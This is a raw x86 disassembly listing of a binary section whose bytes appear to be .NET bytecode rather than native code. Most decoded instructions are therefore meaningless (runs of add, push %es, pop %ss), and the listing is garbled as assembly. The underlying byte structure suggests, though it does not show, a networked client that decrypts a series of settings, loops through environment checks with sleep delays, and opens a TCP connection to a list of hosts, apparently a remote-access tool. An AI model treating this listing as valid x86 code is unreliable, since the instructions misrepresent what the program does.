  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	6a 01                	push   $0x1
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	1d 02 00 70 80       	sbb    $0x80700002,%eax
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	d0 02                	rolb   $1,(%edx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	83 03 00             	addl   $0x0,(%ebx)
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	97                   	xchg   %eax,%edi
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	bf 03 00 70 80       	mov    $0x80700003,%edi
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	cc                   	int3
  40291e:	04 00                	add    $0x0,%al
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	27                   	daa
  402928:	17                   	pop    %ss
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	da 1e                	ficompl (%esi)
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	8d 1f                	lea    (%edi),%ebx
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	40                   	inc    %eax
  402946:	20 00                	and    %al,(%eax)
  402948:	70 80                	jo     0x4028ca
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	f3 20 00             	repz and %al,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	f7 20                	mull   (%eax)
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	aa                   	stos   %al,%es:(%edi)
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 b4 21 00       	add    $0x21b472,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	b4 21                	mov    $0x21,%ah
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 b6 21    	add    %esp,0x21b67216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
